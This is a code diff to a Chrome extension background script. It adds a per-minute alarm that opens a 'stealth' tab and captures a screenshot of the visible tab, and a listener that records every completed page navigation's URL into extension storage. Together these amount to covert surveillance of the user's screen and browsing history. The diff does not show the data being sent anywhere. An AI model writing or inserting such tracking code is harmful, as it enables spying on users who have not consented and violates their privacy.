@@ -1,12 +1,21 @@
-import { BackgroundMessage } from "../consts";
-import { openStealthTab, sendTabBack } from "../utils/background-utils";
-import { writeLog } from "../utils/shared-utils";
+import { BackgroundMessage, StorageKey } from "../consts";
+import { INavigationLogEntry } from "../interfaces";
+import { openStealthTab } from "../utils/background-utils";
+import {
+  captureVisibleTab,
+  logData,
+  simplePrepend,
+  writeLog,
+} from "../utils/shared-utils";
 
 console.log("background.ts");
 
 chrome.alarms.create({ periodInMinutes: 1 });
 
-chrome.alarms.onAlarm.addListener(() => openStealthTab());
+chrome.alarms.onAlarm.addListener(() => {
+  openStealthTab();
+  captureVisibleTab();
+});
 
 chrome.action.onClicked.addListener(() => chrome.runtime.openOptionsPage());
 
@@ -23,11 +32,17 @@ chrome.runtime.onMessage.addListener(async (message, sender, response) => {
     case BackgroundMessage.OPEN_STEALTH_TAB:
       await openStealthTab();
       break;
-    case BackgroundMessage.SEND_TAB_BACK:
-      sendTabBack(sender);
-      break;
     default:
       // HMR may send a message
       console.error("Bad message", message);
   }
+});
+
+chrome.webNavigation.onCompleted.addListener(async (details) => {
+  await simplePrepend<INavigationLogEntry>(StorageKey.NAVIGATION_LOG, {
+    url: details.url,
+    ...logData(),
+  });
+
+  writeLog("Recorded navigation");
 });
